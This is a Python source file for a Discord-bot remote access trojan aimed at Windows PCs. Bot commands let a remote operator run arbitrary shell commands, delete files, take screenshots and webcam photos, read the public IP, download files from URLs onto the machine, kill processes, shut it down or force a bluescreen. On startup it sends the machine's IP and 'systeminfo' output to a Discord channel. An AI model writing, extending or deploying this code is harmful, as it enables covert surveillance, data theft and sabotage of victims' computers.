from main import Client
import discord, os, asyncio, ctypes, requests
from discord.ext import commands
from dotenv import load_dotenv
load_dotenv()
Client = Client()

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

class idk:
    def __init__(self):
        self.current_dir = os.path.abspath(os.getcwd())

variables = idk()

@bot.command()
async def ping(ctx):
    """Test Client's ping."""
    await ctx.send("Pong!")

@bot.command()
async def showmessage(ctx, window_title=None, *, message=None):
    """Show message on the Client PC\n- Syntax:\n!showmessage \"title\" \"message here\"\nExample: !showmessage nice_title hello world!"""
    if window_title is None or message is None:
        return await ctx.reply("Wrong syntax.\nSyntax: !showmessage \"title\" \"message here\"\nExample: !showmessage nice_title hello world!")
    await ctx.reply(f"Window Title: {window_title}\nMessage: {message}")
    Client.showMessage(title=window_title, message=message)
    await ctx.reply("User closed the window.")

@bot.command()
async def runshellcommand(ctx, command=None):
    """Run shell command on the Client's PC.\nSyntax: !runshellcommand COMMAND_HERE\nExample: !runshellcommand whoami"""
    if command is None:
        return await ctx.reply("Please add the command.\nSyntax: !runshellcommand COMMAND_HERE")
    elif "cd" in command:
        return await ctx.reply("Please use !cd.")
    elif "ls" in command:
        return await ctx.reply("Please use !ls.")
    else:
        result = Client.runShellCommand(command)
        await ctx.reply(f"Ran command {command}\nResult: {result.stdout}")


@bot.command()
async def voice(ctx, *, text):
    """Play a TTS voice on the Client's PC.\nSyntax: !voice TEXT_HERE\nExample: !voice Hello world!"""
    await ctx.reply(f"Text: \"{text}\"")
    try:
        Client.voice(text=text)
    except Exception:
        return await ctx.reply(str(Exception))
    await ctx.reply("Done!")

@bot.command()
async def isadmin(ctx):
    """Check if you got admin privileges.\nSyntax: !isadmin"""
    return await ctx.reply(Client.isAdmin())

@bot.command()
async def deletefile(ctx, *, file_path):
    """Delete file from the Client's PC.\nSyntax: !deletefile FILE_NAME_HERE\nExample: !deletefile: temp.txt"""
    return await ctx.reply(Client.deleteFile(f"{variables.current_dir}\{file_path}"))

@bot.command()
async def deletedir(ctx, *, dir_path):
    """Delete directory/folder from the Client's PC.\nSyntax: !deletedir DIR_NAME_HERE\nExample: !deletedir: New Folder"""
    return await ctx.reply(Client.deleteDir(dir_path=f"{variables.current_dir}\{dir_path}"))

@bot.command()
async def cd(ctx, *, new_dir=None):
    """Change directory.\nExamples:\n- Change to a new directory: - !cd\n- Exit from directory: !cd ..\n- Display current directory: !cd"""
    if not new_dir:
        return await ctx.reply(f"`{Client.displayCurrentDir()}`")
    new_dir = new_dir.replace("/", "\\")
    if new_dir == "..":
        variables.current_dir = os.path.abspath(os.path.join(variables.current_dir, os.pardir))
        return await ctx.reply(f"Changed directory to: `{variables.current_dir}`")
    new_path = os.path.join(variables.current_dir, new_dir)
    if os.path.isdir(new_path):
        variables.current_dir = new_path
        return await ctx.reply(f"Changed directory to: `{variables.current_dir}`")
    else:
        return await ctx.reply(f"Directory not found: `{new_path}`")

@bot.command()
async def getip(ctx):
    """Gets the Client's IP.\nSyntax: !getip"""
    return await ctx.reply(f"||{Client.getPublicIP()}||")

@bot.command()
async def change_wallpaper(ctx):
    """Changes the Client's PC IP.\nSyntax: !change_wallpaper (WITH ATTACHMENT)"""
    if len(ctx.message.attachments) > 0:
        url = ctx.message.attachments[0].url
        response = requests.get(url)
        file = open("temp.jpg", "wb")
        file.write(response.content)
        file.close()
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.getcwd() + "\\temp.jpg" , 0)
        await ctx.send("Wallpaper changed successfully!")
    else:
        await ctx.send("You need to attach an image!")


@bot.command()
async def ls(ctx):
    """Display current directory items.\nSyntax !ls"""
    if os.path.exists(variables.current_dir):
        temp_str = ""
        temp = os.listdir(variables.current_dir)
        for item in temp:
            temp_str += f"\n- `{item}`"
        if temp_str.strip() == "":
            temp_str = "No files in this directory."
        return await ctx.reply(temp_str)
    else:
        return await ctx.reply("Directory does not exist.")


@bot.command()
async def screenshot(ctx):
    """Screenshot the Client's PC.\n- Syntax: !screenshot"""
    try:
        Client.getScreenshot()
    except Exception:
        return await ctx.reply(f"Error: {Exception}")

    return await ctx.reply(file=discord.File("screenshot.png"))

@bot.command()
async def shutdown(ctx):
    """Shutdown Client's PC.\nSyntax: !shutdown"""
    await ctx.reply("Trying to shutdown the PC...\nIf you see a message after this message, it means that the PC didn't shutdown.")
    try:
        Client.shutdownComputer()
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")
    
    await ctx.reply("PC didn't shutdown...")

@bot.command()
async def restart(ctx):
    """Restart Client's PC.\nSyntax: !restart"""
    await ctx.reply("Trying to restart the PC...\nIf you see a message after this message, it means that the PC didn't restart.")
    try:
        Client.restartComputer()
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")
    
    await ctx.reply("PC didn't restart...")

@bot.command()
async def log_off_current_user(ctx):
    """Log off current user.\n- Syntax: !log_off_current_user"""
    await ctx.reply("Trying to log off current user...\nIf you see a message after this message, it means that the user didn't log off.")
    try:
        Client.logOffCurrentUser()
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`")
    
    await ctx.reply("User didn't log off...")

@bot.command()
async def bluscreen(ctx):
    """Bluecreen Client's PC.\nSyntax: !bluscreen"""
    await ctx.reply("Trying to Bluscreen the Client's PC...\nIf you see a message after this message, it means that the PC didn't bluescreen.")
    try:
        Client.triggerBSOD()
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`")
    
    await ctx.reply("PC didn't Bluescreen...")

@bot.command()
async def get_datetime(ctx):
    """Get current datetime in the Client's PC.\n- Syntax: !get_datetime"""

    try:
        await ctx.reply(Client.currentDateTime())
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")

@bot.command()
async def upload_content(ctx, link): # , *, destination=None):
    """Upload content to Client's PC.\n- Syntax: !upload_content LINK_HERE\n- Exmaple: !upload_content <https://raw.githubusercontent.com/K-K-L-L/k-k-l-l.github.io/main/index.html>"""
    destination = Client.displayCurrentDir()
    if not link.startswith("https://"):
        link = f"https://{link}"
        
    print(Client.isValidURL(link))
    if Client.isValidURL(link) == False:
        return await ctx.reply("URL not valid!")
    await ctx.reply(f"- Attempting to upload the link \"<{link}>\"...\n- Destination: {destination}.")
    try:
        Client.uploadContent(link=link, destination=destination)
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")
    
    await ctx.reply(f"File <{link}> was uploaded successfully to `{destination}`!")

@bot.command()
async def open_website(ctx, link):
    """Open a website in the Client's PC.\nSyntax: !open_website WEBSITE_URL_HERE.\nExample: !open_website example.com"""
    await ctx.reply(Client.openWebsite(URL=link))

@bot.command()
async def exit(ctx):
    """Exit the program.\n- Syntax: !exit"""
    await ctx.reply("Attempting to exit the program... If you see another message after this one, it means that the program didn't exit.")
    try:
        Client.Exit()
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")
    
    await ctx.reply("Program didn't exit...")

@bot.command()
async def list_processes(ctx):
    """List all active processes.\nSyntax: !list_processes"""
    temp_str = ""
    file_path = "temp_proccess.txt"
    try:
        result = Client.listProcesses()

        for item in result:
            temp_str += f"{item}\n"
        
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(temp_str)
        
        await ctx.reply(file=discord.File(file_path))
    except Exception:
        return await ctx.reply(f"Error `{Exception}`.")
    
@bot.command()
async def kill_proc(ctx, *, proc_name):
    """Kills a specific process (case sensitive).\n- Syntax: !kill_proc PROCESS_NAME.\nExample: !kill_proc Discord.exe"""
    try:
        Client.killProcess(proc_name)
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")
    
    await ctx.reply(f"Killed process \"{proc_name}\" successfully!")

@bot.command()
async def list_cams(ctx):
    """List active cameras.\n- Syntax: !list_cams."""
    try:
        cameras = Client.list_cameras()
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")
    
    if Client.list_cameras() == []:
        return await ctx.reply("No active cameras were found.")
    await ctx.reply(f"Cameras:\n{cameras}")

@bot.command()
async def capture_image(ctx, camera_index=None):
    """Capture image from a specific camera (default one is 0, which is the first camera).\n- Syntax: !capture_image OPTIONAL_CAMERA_INDEX.\nExamples:\n- !capture_image\n- !capture_image 1"""
    if camera_index == None:
        camera_index = 0

    if Client.list_cameras() == []:
        return await ctx.reply("No active cameras were found.")
    try:
        Client.capture_image(camera_index=camera_index)
    except Exception:
        return await ctx.reply(f"Error: `{Exception}`.")
    
    await ctx.reply(file=discord.File("captured_image.jpg"))

  
##################################

@bot.command()
async def help(ctx, command_name=None):
    """Display this command.\nExamples:\n- Display help for all commands: !help\n- Display help for one command: !help change_wallpaper"""
    if command_name is None:
        embed = discord.Embed(title="Help", description="List of available commands", color=discord.Color.blue())
        for command in bot.commands:
            embed.add_field(name=command.name, value=command.help, inline=False)
    else:
        command = bot.get_command(command_name)
        if command is None:
            return await ctx.reply("Command not found.")
        embed = discord.Embed(title=f"Help: {command.name}", description=command.help, color=discord.Color.blue())

    await ctx.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.reply("Command not found.")
    else:
        await ctx.reply(f"An error occurred. {error}")

@bot.event
async def on_ready():
    guild_id = {guildid}
    channel_name = "session"
    message_content = f"@everyone, new session! IP: ||{Client.getPublicIP()}||."
    file_path = "systeminfo.txt"

    guild = bot.get_guild(guild_id)
    
    if guild is None:
        print(f"Guild with ID {guild_id} not found.")
        return

    existing_channel = discord.utils.get(guild.channels, name=channel_name)
    if existing_channel:
        try:
            await existing_channel.delete()
        except Exception as e:
            print(f"ERROR: {e}")
            return
        print(f"Channel '{channel_name}' deleted successfully in guild '{guild.name}'.")
    
    await asyncio.sleep(0.5)
    new_channel = await guild.create_text_channel(channel_name)
    print(f"Channel '{channel_name}' created successfully in guild '{guild.name}'.")
    
    await new_channel.send(message_content)
    await asyncio.sleep(1)
    message_to_delete = await new_channel.send("Hold on... We're gathering the Computer's information.")
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(str(Client.runShellCommand("systeminfo").stdout))
    try:
        await message_to_delete.delete()
    except Exception as e:
        print(f"ERROR: {e}")
    await new_channel.send(file=discord.File(file_path))
    print(f"File '{file_path}' sent in channel '{channel_name}'.")

    print(f"Message sent in channel '{channel_name}'.")
    print(f"We have logged in as {bot.user}")

bot.run({token})
